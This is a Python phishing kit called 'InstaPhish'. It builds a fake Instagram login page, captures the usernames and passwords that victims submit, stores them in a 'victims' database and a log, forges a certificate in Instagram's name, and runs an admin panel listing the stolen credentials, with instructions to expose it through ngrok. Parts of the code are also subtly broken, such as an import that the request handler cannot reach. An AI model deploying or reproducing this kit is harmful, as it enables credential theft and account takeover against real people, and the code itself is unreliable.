#!/usr/bin/env python3
# InstaPhish - Single File Deployment
# Fixed: JavaScript injection properly escaped

import os, sys, json, ssl, time, base64, sqlite3, threading
from pathlib import Path
from datetime import datetime

# ==================== CONFIG ====================
CONFIG_FILE = "config.json"

DEFAULT_CONFIG = {
    "proxy_port": 443,
    "admin_port": 8080,
    "domain": "instagram.com",
    "lure_path": "lures/",
    "log_path": "logs/",
    "cert_path": "certs/"
}

def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE) as f:
            return {**DEFAULT_CONFIG, **json.load(f)}
    with open(CONFIG_FILE, "w") as f:
        json.dump(DEFAULT_CONFIG, f, indent=4)
    return DEFAULT_CONFIG

# ==================== SETUP ====================
def setup_dirs():
    for d in ["lures", "logs", "certs", "phishlets"]:
        Path(d).mkdir(parents=True, exist_ok=True)

def init_db():
    conn = sqlite3.connect("victims.db")
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT,
        ip TEXT,
        username TEXT,
        password TEXT,
        session_cookies TEXT,
        csrf_token TEXT,
        two_factor_code TEXT,
        user_agent TEXT
    )''')
    conn.commit()
    conn.close()

def gen_ssl():
    if not os.path.exists("certs/instagram.crt"):
        os.system('''openssl req -x509 -newkey rsa:4096 -sha256 -days 365 -nodes \
            -keyout certs/instagram.key -out certs/instagram.crt \
            -subj "/C=US/ST=CA/L=Menlo Park/O=Instagram/CN=*.instagram.com" \
            -addext "subjectAltName=DNS:instagram.com,DNS:*.instagram.com,DNS:*.cdninstagram.com" 2>/dev/null''')

# ==================== LURE PAGE ====================
def create_lure():
    html = """<!DOCTYPE html>
<html>
<head>
<title>Instagram</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fafafa;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}
.container{width:350px}
.box{background:#fff;border:1px solid #dbdbdb;padding:40px 40px 20px;margin-bottom:10px;text-align:center}
.logo{font-size:48px;margin-bottom:20px}
input{width:100%;padding:9px 8px;margin:5px 0;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;font-size:12px;color:#262626}
input:focus{outline:none;border-color:#a8a8a8}
button{width:100%;padding:7px;background:#0095f6;color:#fff;border:none;border-radius:4px;font-weight:600;font-size:14px;margin-top:15px;cursor:pointer}
button:hover{background:#1877f2}
.divider{display:flex;align-items:center;margin:20px 0;color:#8e8e8e;font-size:13px;font-weight:600}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#dbdbdb}
.divider span{margin:0 18px}
.fb{color:#385185;font-weight:600;font-size:14px;text-decoration:none;display:block;margin:15px 0}
.forgot{color:#00376b;font-size:12px;text-decoration:none;margin-top:15px;display:block}
.signup{background:#fff;border:1px solid #dbdbdb;padding:20px;text-align:center;font-size:14px}
.signup a{color:#0095f6;font-weight:600;text-decoration:none}
</style>
</head>
<body>
<div class="container">
<div class="box">
<div class="logo">&#x1F4F7;</div>
<form id="loginForm" method="POST" action="/login">
<input type="text" name="username" placeholder="Phone number, username, or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="divider"><span>OR</span></div>
<a href="#" class="fb">Log in with Facebook</a>
<a href="#" class="forgot">Forgot password?</a>
</div>
<div class="signup">Don't have an account? <a href="#">Sign up</a></div>
</div>
<script>
document.getElementById('loginForm').addEventListener('submit', function(e) {
    var u = document.querySelector('[name="username"]').value;
    var p = document.querySelector('[name="password"]').value;
    var img = new Image();
    img.src = '/capture?u=' + encodeURIComponent(u) + '&p=' + encodeURIComponent(p);
});
</script>
</body>
</html>"""
    with open("lures/instagram.html", "w") as f:
        f.write(html)

# ==================== CAPTURE SERVER ====================
def start_capture_server(port):
    import http.server
    import socketserver
    
    class CaptureHandler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            if '/capture' in self.path:
                qs = self.path.split('?')[1] if '?' in self.path else ''
                params = {}
                for p in qs.split('&'):
                    if '=' in p:
                        k, v = p.split('=', 1)
                        params[k] = urllib.parse.unquote(v)
                
                username = params.get('u', '')
                password = params.get('p', '')
                
                if username or password:
                    conn = sqlite3.connect("victims.db")
                    c = conn.cursor()
                    c.execute('''INSERT INTO victims (timestamp, ip, username, password, user_agent)
                                 VALUES (?, ?, ?, ?, ?)''',
                              (datetime.now().isoformat(), self.client_address[0],
                               username, password, self.headers.get('User-Agent', '')))
                    conn.commit()
                    conn.close()
                    
                    with open("logs/creds.txt", "a") as f:
                        f.write(f"[{datetime.now()}] IP: {self.client_address[0]} | USER: {username} | PASS: {password}\n")
                    
                    print(f"\n[+] CAPTURED: {username}:{password} from {self.client_address[0]}")
                
                self.send_response(200)
                self.send_header('Content-type', 'image/gif')
                self.end_headers()
                self.wfile.write(b'GIF89a')
            elif self.path == '/' or self.path == '/login':
                with open("lures/instagram.html", "rb") as f:
                    content = f.read()
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(content)
            else:
                self.send_response(302)
                self.send_header('Location', 'https://www.instagram.com')
                self.end_headers()
        
        def do_POST(self):
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length > 0:
                post_data = self.rfile.read(content_length).decode()
                import urllib.parse
                params = urllib.parse.parse_qs(post_data)
                
                username = params.get('username', [''])[0]
                password = params.get('password', [''])[0]
                
                if username or password:
                    conn = sqlite3.connect("victims.db")
                    c = conn.cursor()
                    c.execute('''INSERT INTO victims (timestamp, ip, username, password, user_agent)
                                 VALUES (?, ?, ?, ?, ?)''',
                              (datetime.now().isoformat(), self.client_address[0],
                               username, password, self.headers.get('User-Agent', '')))
                    conn.commit()
                    conn.close()
                    
                    with open("logs/creds.txt", "a") as f:
                        f.write(f"[{datetime.now()}] IP: {self.client_address[0]} | USER: {username} | PASS: {password}\n")
                    
                    print(f"\n[+] CAPTURED: {username}:{password} from {self.client_address[0]}")
            
            self.send_response(302)
            self.send_header('Location', 'https://www.instagram.com/accounts/login/')
            self.end_headers()
        
        def log_message(self, format, *args):
            pass  # Silent
    
    server = socketserver.ThreadingTCPServer(('0.0.0.0', port), CaptureHandler)
    print(f"[+] Server running on port {port}")
    server.serve_forever()

# ==================== ADMIN PANEL ====================
def start_admin_panel(port):
    admin_code = f"""
from flask import Flask, render_template_string
import sqlite3

app = Flask(__name__)

HTML = '''
<!DOCTYPE html>
<html><head><title>InstaPhish Panel</title>
<style>
body{{background:#000;color:#0f0;font-family:monospace;padding:20px}}
table{{border-collapse:collapse;width:100%}}
th,td{{border:1px solid #0f0;padding:10px;text-align:left}}
th{{background:#001a00}}
tr:hover{{background:#001100}}
</style></head><body>
<h1>InstaPhish v1.0 | Victims: {{count}}</h1>
<table>
<tr><th>Time</th><th>IP</th><th>Username</th><th>Password</th><th>User Agent</th></tr>
{{% for v in victims %}}
<tr><td>{{{{v[1]}}}}</td><td>{{{{v[2]}}}}</td><td>{{{{v[3]}}}}</td><td>{{{{v[4]}}}}</td><td>{{{{v[7]}}}}</td></tr>
{{% endfor %}}
</table></body></html>
'''

@app.route('/')
def index():
    conn = sqlite3.connect('victims.db')
    c = conn.cursor()
    c.execute('SELECT * FROM victims ORDER BY id DESC')
    victims = c.fetchall()
    conn.close()
    return render_template_string(HTML.replace('{{','{{').replace('}}','}}'), victims=victims, count=len(victims))

app.run(host='0.0.0.0', port={port}, debug=False)
"""
    with open("admin.py", "w") as f:
        f.write(admin_code)
    os.system(f"python3 admin.py &")
    print(f"[+] Admin panel: http://0.0.0.0:{port}")

# ==================== MAIN ====================
def main():
    import urllib.parse  # Added here for the handler
    
    config = load_config()
    setup_dirs()
    init_db()
    gen_ssl()
    create_lure()
    
    print("""
╔══════════════════════════════════╗
║      INSTAPHISH v1.0             ║
║      github.com/r4tur1           ║
╚══════════════════════════════════╝
    """)
    
    # Start admin panel in background
    threading.Thread(target=start_admin_panel, args=(config["admin_port"],), daemon=True).start()
    
    # Start main capture server
    print(f"[*] Starting on port {config['proxy_port']}...")
    print(f"[*] Local: https://127.0.0.1:{config['proxy_port']}")
    print(f"[*] Admin: http://127.0.0.1:{config['admin_port']}")
    print("\n[*] Expose with: ngrok http {}\n".format(config['proxy_port']))
    
    start_capture_server(config["proxy_port"])

if __name__ == "__main__":
    main()
